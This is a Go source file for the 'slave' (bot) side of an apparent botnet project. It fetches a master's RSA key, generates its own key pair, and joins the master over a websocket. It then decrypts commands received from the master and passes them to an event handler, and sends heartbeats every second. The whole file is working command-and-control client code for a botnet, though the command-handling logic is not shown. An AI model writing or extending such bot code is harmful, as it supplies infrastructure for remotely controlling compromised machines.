package slave

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/adrianosela/botnet/master"
)

// BotnetSlave is the slave program controller
type BotnetSlave struct {
	masterAddr   string
	masterPubKey *rsa.PublicKey
	slavePrivKey *rsa.PrivateKey
	slavePubKey  string
}

// NewBotnetSlave initializes a BotnetSlave to its master
func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
	masterPubKey, rawPEM, err := getMasterPubKey(masterAddr)
	if err != nil {
		return nil, err
	}
	log.Printf("[slave] fetched master pub key: \n%s", rawPEM)
	slavePriv, slavePub, err := encryption.GenerateRSAKeyPair(1024)
	if err != nil {
		return nil, err
	}
	return &BotnetSlave{
		masterAddr:   masterAddr,
		masterPubKey: masterPubKey,
		slavePrivKey: slavePriv,
		slavePubKey:  string(slavePub),
	}, nil
}

// Start runs the initialized slave process
func (s *BotnetSlave) Start() {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	url := fmt.Sprintf("ws://%s%s", s.masterAddr, master.JoinEndpoint)
	log.Printf("connecting to URL: %s", url)

	c, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()
	done := make(chan *protocol.Event)

	// send encrypted join request
	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
	if err != nil {
		log.Fatal(err)
	}

	c.WriteMessage(2, []byte(encrypted)) // binary message type (2)

	go func() {
		defer close(done)
		for {
			messageType, message, err := c.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				return
			}
			// discard non binary type messages
			if messageType != 2 {
				continue
			}
			decryptedJSON, err := encryption.DecryptMessage(message, s.slavePrivKey)
			if err != nil {
				log.Printf("could not decrypt binary message: %s", err)
				continue
			}
			var e protocol.Event
			if err := json.Unmarshal(decryptedJSON, &e); err != nil {
				log.Printf("could not unmarshal json message: %s", err)
				continue
			}
			go protocol.HandleMasterEvent(e)
		}
	}()

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case t := <-ticker.C:
			err := c.WriteMessage(websocket.TextMessage, []byte(t.String()))
			if err != nil {
				log.Printf("write error: %s", err)
				return
			}
		case <-interrupt:
			err := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Printf("write close error: %s", err)
				return
			}
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
